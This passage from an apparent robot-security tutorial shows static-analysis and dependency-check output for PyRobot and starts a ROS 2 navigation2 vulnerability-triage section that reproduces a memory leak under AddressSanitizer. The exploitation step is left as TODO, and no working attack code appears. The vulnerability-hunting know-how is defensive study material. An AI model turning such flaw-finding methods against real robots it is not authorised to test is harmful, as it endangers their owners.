    <span id="cb102-21"><a href="#cb102-21" aria-hidden="true" tabindex="-1"></a><span class="ex">When</span> setting signal handlers, do not use the same function to handle multiple signals. There exists the possibility a race condition will result if 2 or more different signals are sent to the process at nearly the same time. Also, when writing signal handlers, it is best to do as little as possible in them. The best strategy is to use the signal handler to set a flag, that another part of the program tests and performs the appropriate action<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">when</span> it is set.</span>
    <span id="cb102-22"><a href="#cb102-22" aria-hidden="true" tabindex="-1"></a><span class="ex">See</span> also: http://razor.bindview.com/publish/papers/signals.txt</span>
    <span id="cb102-23"><a href="#cb102-23" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb102-24"><a href="#cb102-24" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/manipulation/pushing.py:87:</span> Medium: choice</span>
    <span id="cb102-25"><a href="#cb102-25" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/manipulation/pushing.py:93:</span> Medium: choice</span>
    <span id="cb102-26"><a href="#cb102-26" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/manipulation/pushing.py:96:</span> Medium: choice</span>
    <span id="cb102-27"><a href="#cb102-27" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/locobot/manipulation/pushing.py:99:</span> Medium: choice</span>
    <span id="cb102-28"><a href="#cb102-28" aria-hidden="true" tabindex="-1"></a><span class="ex">./examples/grasping/grasp_samplers/grasp_model.py:227:</span> Medium: choice</span>
    <span id="cb102-29"><a href="#cb102-29" aria-hidden="true" tabindex="-1"></a><span class="ex">./src/pyrobot/locobot/bicycle_model.py:45:</span> Medium: choice</span>
    <span id="cb102-30"><a href="#cb102-30" aria-hidden="true" tabindex="-1"></a><span class="ex">Standard</span> random number generators should not be used to</span>
    <span id="cb102-31"><a href="#cb102-31" aria-hidden="true" tabindex="-1"></a><span class="ex">generate</span> randomness used for security reasons.  For security sensitive randomness a crytographic randomness generator that provides sufficient entropy should be used.</span></code></pre></div>
    <p><em>Complete report at https://gist.github.com/vmayoral/0e7fe9b1eabeaf7d184db3a33864efd9</em></p>
    <h4 id="results-of-safety">Results of <code>safety</code></h4>
    <div class="sourceCode" id="cb103"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb103-1"><a href="#cb103-1" aria-hidden="true" tabindex="-1"></a><span class="ex">safety</span> check <span class="at">-r</span> requirements.txt</span>
    <span id="cb103-2"><a href="#cb103-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Warning:</span> unpinned requirement <span class="st">&#39;numpy&#39;</span> found in requirements.txt, unable to check.</span>
    <span id="cb103-3"><a href="#cb103-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Warning:</span> unpinned requirement <span class="st">&#39;PyYAML&#39;</span> found in requirements.txt, unable to check.</span>
    <span id="cb103-4"><a href="#cb103-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Warning:</span> unpinned requirement <span class="st">&#39;scipy&#39;</span> found in requirements.txt, unable to check.</span>
    <span id="cb103-5"><a href="#cb103-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Warning:</span> unpinned requirement <span class="st">&#39;matplotlib&#39;</span> found in requirements.txt, unable to check.</span>
    <span id="cb103-6"><a href="#cb103-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Warning:</span> unpinned requirement <span class="st">&#39;Pillow&#39;</span> found in requirements.txt, unable to check.</span>
    <span id="cb103-7"><a href="#cb103-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Warning:</span> unpinned requirement <span class="st">&#39;pyassimp&#39;</span> found in requirements.txt, unable to check.</span>
    <span id="cb103-8"><a href="#cb103-8" aria-hidden="true" tabindex="-1"></a><span class="ex">╒══════════════════════════════════════════════════════════════════════════════╕</span></span>
    <span id="cb103-9"><a href="#cb103-9" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>                                                                              │</span>
    <span id="cb103-10"><a href="#cb103-10" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>                               /<span class="va">$$$$$$</span>            /<span class="va">$$</span>                         │</span>
    <span id="cb103-11"><a href="#cb103-11" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>                              /<span class="va">$$</span>__  <span class="va">$$</span>          <span class="kw">|</span> <span class="va">$$</span>                         │</span>
    <span id="cb103-12"><a href="#cb103-12" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>           /<span class="va">$$$$$$</span>$  /<span class="va">$$$$$$</span> <span class="kw">|</span> <span class="va">$$</span>  <span class="dt">\_</span>_//<span class="va">$$$$$$</span>  /<span class="va">$$$$$$</span>   /<span class="va">$$</span>   /<span class="va">$$</span>           │</span>
    <span id="cb103-13"><a href="#cb103-13" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>          /<span class="va">$$</span>_____/ <span class="kw">|</span><span class="ex">____</span>  <span class="va">$$</span><span class="kw">|</span> <span class="va">$$$$</span>   /<span class="va">$$</span>__  <span class="va">$$</span><span class="kw">|</span><span class="ex">_</span>  <span class="va">$$</span>_/  <span class="kw">|</span> <span class="va">$$</span>  <span class="kw">|</span> <span class="va">$$</span>           │</span>
    <span id="cb103-14"><a href="#cb103-14" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>         <span class="kw">|</span>  <span class="va">$$$$$$</span>   /<span class="va">$$$$$$</span>$<span class="kw">|</span> <span class="va">$$</span><span class="ex">_/</span>  <span class="kw">|</span> <span class="va">$$$$$$$$</span>  <span class="kw">|</span> <span class="va">$$</span>    <span class="kw">|</span> <span class="va">$$</span>  <span class="kw">|</span> <span class="va">$$</span>           │</span>
    <span id="cb103-15"><a href="#cb103-15" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>          <span class="dt">\_</span>___  <span class="va">$$</span> /<span class="va">$$</span>__  <span class="va">$$</span><span class="kw">|</span> <span class="va">$$</span>    <span class="kw">|</span> <span class="va">$$</span><span class="ex">_____/</span>  <span class="kw">|</span> <span class="va">$$</span> /<span class="va">$$</span><span class="kw">|</span> <span class="va">$$</span>  <span class="kw">|</span> <span class="va">$$</span>           │</span>
    <span id="cb103-16"><a href="#cb103-16" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>          /<span class="va">$$$$$$</span>$/<span class="kw">|</span>  <span class="va">$$$$$$</span><span class="ex">$</span><span class="kw">|</span> <span class="va">$$</span>    <span class="kw">|</span>  <span class="va">$$$$$$</span><span class="ex">$</span>  <span class="kw">|</span>  <span class="va">$$$$</span><span class="ex">/</span><span class="kw">|</span>  <span class="va">$$$$$$</span><span class="ex">$</span>           │</span>
    <span id="cb103-17"><a href="#cb103-17" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>         <span class="kw">|</span><span class="ex">_______/</span>  <span class="dt">\_</span>______/<span class="kw">|</span><span class="ex">__/</span>     <span class="dt">\_</span>______/   <span class="dt">\_</span>__/   <span class="dt">\_</span>___  <span class="va">$$</span>           │</span>
    <span id="cb103-18"><a href="#cb103-18" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>                                                          /<span class="va">$$</span>  <span class="kw">|</span> <span class="va">$$</span>           │</span>
    <span id="cb103-19"><a href="#cb103-19" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>                                                         <span class="kw">|</span>  <span class="va">$$$$$$</span><span class="ex">/</span>           │</span>
    <span id="cb103-20"><a href="#cb103-20" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>  by pyup.io                                              <span class="dt">\_</span>_____/            │</span>
    <span id="cb103-21"><a href="#cb103-21" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span>                                                                              │</span>
    <span id="cb103-22"><a href="#cb103-22" aria-hidden="true" tabindex="-1"></a><span class="ex">╞══════════════════════════════════════════════════════════════════════════════╡</span></span>
    <span id="cb103-23"><a href="#cb103-23" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span> REPORT                                                                       │</span>
    <span id="cb103-24"><a href="#cb103-24" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span> checked 10 packages, using default DB                                        │</span>
    <span id="cb103-25"><a href="#cb103-25" aria-hidden="true" tabindex="-1"></a><span class="ex">╞══════════════════════════════════════════════════════════════════════════════╡</span></span>
    <span id="cb103-26"><a href="#cb103-26" aria-hidden="true" tabindex="-1"></a><span class="ex">│</span> No known security vulnerabilities found.                                     │</span>
    <span id="cb103-27"><a href="#cb103-27" aria-hidden="true" tabindex="-1"></a><span class="ex">╘══════════════════════════════════════════════════════════════════════════════╛</span></span></code></pre></div>
    <h3 id="resources-6">Resources</h3>
    <ul>
    <li>[1] https://github.com/facebookresearch/pyrobot</li>
    <li>[2] https://arxiv.org/pdf/1906.08236.pdf</li>
    <li>[3] https://ai.facebook.com/blog/open-sourcing-pyrobot-to-accelerate-ai-robotics-research/</li>
    <li>[4] https://github.com/ros-industrial</li>
    </ul>
    <h2 id="tutorial-6-looking-for-vulnerabilities-in-ros-2">Tutorial 6: Looking for vulnerabilities in ROS 2</h2>
    <p>This tutorial aims to assess the flaws found in the navigation2 package and determine whether they can turn into vulnerabilities.</p>
    <!-- TOC depthFrom:1 depthTo:6 withLinks:1 updateOnSave:1 orderedList:0 -->
    <pre><code>- [Tutorial 6: Looking for vulnerabilities in ROS 2](#tutorial-6-looking-for-vulnerabilities-in-ros-2)
        - [Reconnaissance](#reconnaissance)
        - [Testing](#testing)
        - [Exploitation](#exploitation)
        - [Mitigation or remediation](#mitigation-or-remediation)
            - [nav2_util, https://github.com/aliasrobotics/RVD/issues/167](#nav2util-httpsgithubcomaliasroboticsrvdissues167)
                - [Exploring CLion IDE](#exploring-clion-ide)
                - [Case 1](#case-1)
                - [Case 2](#case-2)
                - [Case 3](#case-3)
                - [Remediation](#remediation)
            - [rclcpp: SEGV on unknown address https://github.com/aliasrobotics/RVD/issues/166](#rclcpp-segv-on-unknown-address-httpsgithubcomaliasroboticsrvdissues166)
            - [Network Reconnaissance and VulnerabilityExcavation of Secure DDS Systems](#network-reconnaissance-and-vulnerabilityexcavation-of-secure-dds-systems)
            - [ROS2-SecTest https://github.com/aws-robotics/ROS2-SecTest](#ros2-sectest-httpsgithubcomaws-roboticsros2-sectest)
            - [rclcpp, UBSAN: runtime error publisher_options https://github.com/aliasrobotics/RVD/issues/445](#rclcpp-ubsan-runtime-error-publisheroptions-httpsgithubcomaliasroboticsrvdissues445)
            - [Security and Performance Considerations in ROS 2: A Balancing Act](#security-and-performance-considerations-in-ros-2-a-balancing-act)
            - [Exception sending message over network https://github.com/ros2/rmw_fastrtps/issues/317](#exception-sending-message-over-network-httpsgithubcomros2rmwfastrtpsissues317)
    - [Resources](#resources)</code></pre>
    <!-- /TOC -->
    <h3 id="reconnaissance-1">Reconnaissance</h3>
    <p>(ommitted)</p>
    <h3 id="testing">Testing</h3>
    <p>(omitted, results available at https://github.com/aliasrobotics/RVD/issues?q=is%3Aissue+is%3Aopen+label%3A%22robot+component%3A+navigation2%22)</p>
    <h3 id="exploitation">Exploitation</h3>
    <p>TODO</p>
    <h3 id="mitigation-or-remediation">Mitigation or remediation</h3>
    <p>Let’s start patching a few of the flaws found</p>
    <h4 id="nav2_util-httpsgithub.comaliasroboticsrvdissues167">nav2_util, https://github.com/aliasrobotics/RVD/issues/167</h4>
    <p>For mitigating this we’ll use <code>robocalypse</code> with the following configuration (the <code>robocalypserc</code> file):</p>
    <div class="sourceCode" id="cb105"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb105-1"><a href="#cb105-1" aria-hidden="true" tabindex="-1"></a> <span class="co"># robocalypserc file</span></span>
    <span id="cb105-2"><a href="#cb105-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb105-3"><a href="#cb105-3" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">ADE_IMAGES</span><span class="op">=</span><span class="st">&quot;</span></span>
    <span id="cb105-4"><a href="#cb105-4" aria-hidden="true" tabindex="-1"></a><span class="st">  registry.gitlab.com/aliasrobotics/offensive-team/robocalypsepr/ros2_navigation2/navigation2:build-asan</span></span>
    <span id="cb105-5"><a href="#cb105-5" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;</span></span></code></pre></div>
    <p>This configuration of <code>robocalypse</code> uses only the <code>navigation2:build-asan</code> module. This module does not provide a volume with the contents mounted. We use the “build” (intermediary) image as the base image <strong>to get access to a pre-compiled dev. environment</strong>.</p>
    <p>It’s relevant to note that the stacktrace does not provide much:</p>
    <div class="sourceCode" id="cb106"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb106-1"><a href="#cb106-1" aria-hidden="true" tabindex="-1"></a> <span class="co">#0 0x7f9da732df40 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdef40)</span></span>
    <span id="cb106-2"><a href="#cb106-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x7f9da319db1d in rcl_lifecycle_register_transition /home/jenkins-agent/workspace/packaging_linux/ws/src/ros2/rcl/rcl_lifecycle/src/transition_map.c:131</span></span></code></pre></div>
    <p><em>NOTE the similarity with https://github.com/aliasrobotics/RVD/issues/170</em></p>
    <p>What’s worth noting here is that the issue seems to be in <code>rcl_lifecycle</code> however we don’t get a clear picture because this issue was reported from a test that used an installation from deb files (which justifies the link to /home/jenkins …).</p>
    <p>Let’s try and reproduce this leak:</p>
    <p>Firt, let’s start <code>robocalypse</code>:</p>
    <div class="sourceCode" id="cb107"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb107-1"><a href="#cb107-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> robocalypse start</span>
    <span id="cb107-2"><a href="#cb107-2" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb107-3"><a href="#cb107-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> robocalypse enter</span>
    <span id="cb107-4"><a href="#cb107-4" aria-hidden="true" tabindex="-1"></a><span class="ex">victor@robocalypse:~$</span></span></code></pre></div>
    <p>Let’s now debug the particular flaw:</p>
    <div class="sourceCode" id="cb108"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb108-1"><a href="#cb108-1" aria-hidden="true" tabindex="-1"></a><span class="ex">victor@robocalypse:/opt/ros2_navigation2/build-asan/nav2_util/test$</span> source /opt/ros2_ws/install-asan/setup.bash</span>
    <span id="cb108-2"><a href="#cb108-2" aria-hidden="true" tabindex="-1"></a><span class="ex">victor@robocalypse:/opt/ros2_navigation2/build-asan/nav2_util/test$</span> ./test_lifecycle_utils</span>
    <span id="cb108-3"><a href="#cb108-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb108-4"><a href="#cb108-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 1 test from 1 test case.</span>
    <span id="cb108-5"><a href="#cb108-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb108-6"><a href="#cb108-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from Lifecycle</span>
    <span id="cb108-7"><a href="#cb108-7" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">Lifecycle.interface</span></span>
    <span id="cb108-8"><a href="#cb108-8" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">Lifecycle.interface</span> <span class="er">(</span><span class="ex">667</span> ms<span class="kw">)</span></span>
    <span id="cb108-9"><a href="#cb108-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from Lifecycle <span class="er">(</span><span class="ex">667</span> ms total<span class="kw">)</span></span>
    <span id="cb108-10"><a href="#cb108-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb108-11"><a href="#cb108-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb108-12"><a href="#cb108-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 1 test from 1 test case ran. <span class="er">(</span><span class="ex">668</span> ms total<span class="kw">)</span></span>
    <span id="cb108-13"><a href="#cb108-13" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">1</span> test.</span>
    <span id="cb108-14"><a href="#cb108-14" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb108-15"><a href="#cb108-15" aria-hidden="true" tabindex="-1"></a><span class="ex">=================================================================</span></span>
    <span id="cb108-16"><a href="#cb108-16" aria-hidden="true" tabindex="-1"></a><span class="ex">==92==ERROR:</span> LeakSanitizer: detected memory leaks</span>
    <span id="cb108-17"><a href="#cb108-17" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb108-18"><a href="#cb108-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 96 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb108-19"><a href="#cb108-19" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7fd0d003ef40 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdef40)</span></span>
    <span id="cb108-20"><a href="#cb108-20" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x7fd0cf1074ad in __default_reallocate /opt/ros2_ws/src/ros2/rcutils/src/allocator.c:49</span></span>
    <span id="cb108-21"><a href="#cb108-21" aria-hidden="true" tabindex="-1"></a>    <span class="co">#2 0x7fd0cd8a0c52 in rcl_lifecycle_register_transition /opt/ros2_ws/src/ros2/rcl/rcl_lifecycle/src/transition_map.c:131</span></span>
    <span id="cb108-22"><a href="#cb108-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">#3 0x7fd0cd89c3fd in _register_transitions /opt/ros2_ws/src/ros2/rcl/rcl_lifecycle/src/default_state_machine.c:497</span></span>
    <span id="cb108-23"><a href="#cb108-23" aria-hidden="true" tabindex="-1"></a>    <span class="co">#4 0x7fd0cd89c985 in rcl_lifecycle_init_default_state_machine /opt/ros2_ws/src/ros2/rcl/rcl_lifecycle/src/default_state_machine.c:680</span></span>
    <span id="cb108-24"><a href="#cb108-24" aria-hidden="true" tabindex="-1"></a>    <span class="co">#5 0x7fd0cd89d70f in rcl_lifecycle_state_machine_init /opt/ros2_ws/src/ros2/rcl/rcl_lifecycle/src/rcl_lifecycle.c:210</span></span>
    <span id="cb108-25"><a href="#cb108-25" aria-hidden="true" tabindex="-1"></a>    <span class="co">#6 0x7fd0cfcf9e3a in rclcpp_lifecycle::LifecycleNode::LifecycleNodeInterfaceImpl::init() /opt/ros2_ws/src/ros2/rclcpp/rclcpp_lifecycle/src/lifecycle_node_interface_impl.hpp:100</span></span>
    <span id="cb108-26"><a href="#cb108-26" aria-hidden="true" tabindex="-1"></a>    <span class="co">#7 0x7fd0cfcf2f20 in rclcpp_lifecycle::LifecycleNode::LifecycleNode(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, rclcpp::NodeOptions const&amp;) /opt/ros2_ws/src/ros2/rclcpp/rclcpp_lifecycle/src/lifecycle_node.cpp:105</span></span>
    <span id="cb108-27"><a href="#cb108-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">#8 0x7fd0cfcf1cf2 in rclcpp_lifecycle::LifecycleNode::LifecycleNode(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, rclcpp::NodeOptions const&amp;) /opt/ros2_ws/src/ros2/rclcpp/rclcpp_lifecycle/src/lifecycle_node.cpp:53</span></span>
    <span id="cb108-28"><a href="#cb108-28" aria-hidden="true" tabindex="-1"></a>    <span class="co">#9 0x55a04d116e63 in void __gnu_cxx::new_allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;::construct&lt;rclcpp_lifecycle::LifecycleNode, char const (&amp;) [4]&gt;(rclcpp_lifecycle::LifecycleNode*, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x2be63)</span></span>
    <span id="cb108-29"><a href="#cb108-29" aria-hidden="true" tabindex="-1"></a>    <span class="co">#10 0x55a04d116815 in void std::allocator_traits&lt;std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt; &gt;::construct&lt;rclcpp_lifecycle::LifecycleNode, char const (&amp;) [4]&gt;(std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;&amp;, rclcpp_lifecycle::LifecycleNode*, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x2b815)</span></span>
    <span id="cb108-30"><a href="#cb108-30" aria-hidden="true" tabindex="-1"></a>    <span class="co">#11 0x55a04d1163ae in std::_Sp_counted_ptr_inplace&lt;rclcpp_lifecycle::LifecycleNode, std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;, (__gnu_cxx::_Lock_policy)2&gt;::_Sp_counted_ptr_inplace&lt;char const (&amp;) [4]&gt;(std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x2b3ae)</span></span>
    <span id="cb108-31"><a href="#cb108-31" aria-hidden="true" tabindex="-1"></a>    <span class="co">#12 0x55a04d115923 in std::__shared_count&lt;(__gnu_cxx::_Lock_policy)2&gt;::__shared_count&lt;rclcpp_lifecycle::LifecycleNode, std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;, char const (&amp;) [4]&gt;(std::_Sp_make_shared_tag, rclcpp_lifecycle::LifecycleNode*, std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt; const&amp;, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x2a923)</span></span>
    <span id="cb108-32"><a href="#cb108-32" aria-hidden="true" tabindex="-1"></a>    <span class="co">#13 0x55a04d114dbc in std::__shared_ptr&lt;rclcpp_lifecycle::LifecycleNode, (__gnu_cxx::_Lock_policy)2&gt;::__shared_ptr&lt;std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;, char const (&amp;) [4]&gt;(std::_Sp_make_shared_tag, std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt; const&amp;, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x29dbc)</span></span>
    <span id="cb108-33"><a href="#cb108-33" aria-hidden="true" tabindex="-1"></a>    <span class="co">#14 0x55a04d1143a6 in std::shared_ptr&lt;rclcpp_lifecycle::LifecycleNode&gt;::shared_ptr&lt;std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;, char const (&amp;) [4]&gt;(std::_Sp_make_shared_tag, std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt; const&amp;, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x293a6)</span></span>
    <span id="cb108-34"><a href="#cb108-34" aria-hidden="true" tabindex="-1"></a>    <span class="co">#15 0x55a04d113569 in std::shared_ptr&lt;rclcpp_lifecycle::LifecycleNode&gt; std::allocate_shared&lt;rclcpp_lifecycle::LifecycleNode, std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt;, char const (&amp;) [4]&gt;(std::allocator&lt;rclcpp_lifecycle::LifecycleNode&gt; const&amp;, char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x28569)</span></span>
    <span id="cb108-35"><a href="#cb108-35" aria-hidden="true" tabindex="-1"></a>    <span class="co">#16 0x55a04d1122a6 in std::shared_ptr&lt;rclcpp_lifecycle::LifecycleNode&gt; std::make_shared&lt;rclcpp_lifecycle::LifecycleNode, char const (&amp;) [4]&gt;(char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x272a6)</span></span>
    <span id="cb108-36"><a href="#cb108-36" aria-hidden="true" tabindex="-1"></a>    <span class="co">#17 0x55a04d11116f in std::shared_ptr&lt;rclcpp_lifecycle::LifecycleNode&gt; rclcpp_lifecycle::LifecycleNode::make_shared&lt;char const (&amp;) [4]&gt;(char const (&amp;) [4]) (/opt/ros2_navigation2/build-asan/nav2_util/test/test_lifecycle_utils+0x2616f)</span></span>
    <span id="cb108-37"><a href="#cb108-37" aria-hidden="true" tabindex="-1"></a>    <span class="co">#18 0x55a04d10ea7d in Lifecycle_interface_Test::TestBody() /opt/ros2_navigation2/src/navigation2/nav2_util/test/test_lifecycle_utils.cpp:51</span></span>
    <span id="cb108-38"><a href="#cb108-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">#19 0x55a04d18d3e9 in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb108-39"><a href="#cb108-39" aria-hidden="true" tabindex="-1"></a>    <span class="co">#20 0x55a04d17f254 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb108-40"><a href="#cb108-40" aria-hidden="true" tabindex="-1"></a>    <span class="co">#21 0x55a04d12aabb in testing::Test::Run() /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522</span></span>
    <span id="cb108-41"><a href="#cb108-41" aria-hidden="true" tabindex="-1"></a>    <span class="co">#22 0x55a04d12bef0 in testing::TestInfo::Run() /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703</span></span>
    <span id="cb108-42"><a href="#cb108-42" aria-hidden="true" tabindex="-1"></a>    <span class="co">#23 0x55a04d12cab5 in testing::TestCase::Run() /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825</span></span>
    <span id="cb108-43"><a href="#cb108-43" aria-hidden="true" tabindex="-1"></a>    <span class="co">#24 0x55a04d147d84 in testing::internal::UnitTestImpl::RunAllTests() /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216</span></span>
    <span id="cb108-44"><a href="#cb108-44" aria-hidden="true" tabindex="-1"></a>    <span class="co">#25 0x55a04d18fec5 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447</span></span>
    <span id="cb108-45"><a href="#cb108-45" aria-hidden="true" tabindex="-1"></a>    <span class="co">#26 0x55a04d181533 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483</span></span>
    <span id="cb108-46"><a href="#cb108-46" aria-hidden="true" tabindex="-1"></a>    <span class="co">#27 0x55a04d144ad3 in testing::UnitTest::Run() /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824</span></span>
    <span id="cb108-47"><a href="#cb108-47" aria-hidden="true" tabindex="-1"></a>    <span class="co">#28 0x55a04d117d68 in RUN_ALL_TESTS() /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370</span></span>
    <span id="cb108-48"><a href="#cb108-48" aria-hidden="true" tabindex="-1"></a>    <span class="co">#29 0x55a04d117cae in main /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36</span></span></code></pre></div>
    <h5 id="exploring-clion-ide">Exploring CLion IDE</h5>
    <p>Before grabbing gdb and digging into this, let’s see if using an external IDE helps in the process (it should, generally) and increases productivity.</p>
    <p>Tried out CLion’s module for <code>robocalypse</code> using X11 (XQuartz). Works good. Followed https://www.jetbrains.com/help/clion/ros-setup-tutorial.html to set up ROS 2 ws. Used the second option and did build the symbols for most of the things in ROS 2. Navigating the code with this is much easier indeed.</p>
    <p>Managed to get a simple <code>minimal_publisher</code> loaded (I first loaded the whole ws, the src file, and later “File-&gt;New CMake Project from Sources” and selected solely the <code>minimal_publisher</code>).</p>
    <figure>
    <img src="background/images/2019/09/clion-launch-of-a-ros-2-publisher-fails-due-to-asan-compilation.png" alt="CLion launch of a ROS 2 publisher, fails due to ASan compilation" /><figcaption aria-hidden="true">CLion launch of a ROS 2 publisher, fails due to ASan compilation</figcaption>
    </figure>
    <p>What’s interesting is that CLion builds using CMake a new folder <code>cmake-build-debug</code></p>
    <figure>
    <img src="background/images/2019/09/asan-dependency-creating-issues.png" alt="ASan dependency creating issues" /><figcaption aria-hidden="true">ASan dependency creating issues</figcaption>
    </figure>
    <p>The binary won’t launch unless we <code>export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libasan.so.4</code>. Then:</p>
    <figure>
    <img src="background/images/2019/09/after-making-asan-library-available-it-works-from-the-command-line.png" alt="After making ASan library available, it works from the command line" /><figcaption aria-hidden="true">After making ASan library available, it works from the command line</figcaption>
    </figure>
